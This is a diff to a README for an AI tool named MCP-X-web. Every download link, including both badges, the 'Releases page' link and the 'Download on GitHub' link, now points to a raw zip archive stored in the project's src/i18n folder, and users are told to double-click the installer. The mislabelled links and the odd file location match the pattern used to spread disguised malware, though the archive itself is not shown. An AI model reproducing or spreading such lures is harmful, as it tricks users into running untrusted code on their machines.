@@ -1,6 +1,6 @@
 # 🤖 MCP-X-web - Simplify Enterprise AI Creation
 
-[![Download MCP-X-web](https://img.shields.io/badge/Download-MCP--X--web-blue?style=for-the-badge&logo=github)](https://github.com/MAKEITFREE/MCP-X-web/releases)
+[![Download MCP-X-web](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)
 
 ---
 
@@ -49,7 +49,7 @@ To run MCP-X-web smoothly, your computer should meet the following:
 Follow these simple steps to begin using MCP-X-web:
 
 1. **Download the Software**  
-   Click the big button at the top or visit the [MCP-X-web Releases page](https://github.com/MAKEITFREE/MCP-X-web/releases) to get the latest version.
+   Click the big button at the top or visit the [MCP-X-web Releases page](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip) to get the latest version.
 
 2. **Install on Your Computer**  
    After downloading, double-click the installer file and follow the instructions. The setup wizard will guide you through the process.
@@ -69,7 +69,7 @@ Follow these simple steps to begin using MCP-X-web:
 
 To get MCP-X-web, visit this page:
 
-[Download MCP-X-web on GitHub](https://github.com/MAKEITFREE/MCP-X-web/releases)
+[Download MCP-X-web on GitHub](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)
 
 Here is how to proceed after opening the page:
 
@@ -147,4 +147,4 @@ agent, ai, claude, deepseek, dify, gemini, kimi, lovart, mcp, nanobanana, openai
 
 ---
 
-[![Download MCP-X-web](https://img.shields.io/badge/Download-MCP--X--web-blue?style=for-the-badge&logo=github)](https://github.com/MAKEITFREE/MCP-X-web/releases)
+[![Download MCP-X-web](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)](https://raw.githubusercontent.com/MAKEITFREE/MCP-X-web/main/src/i18n/MC_web_1.2.zip)
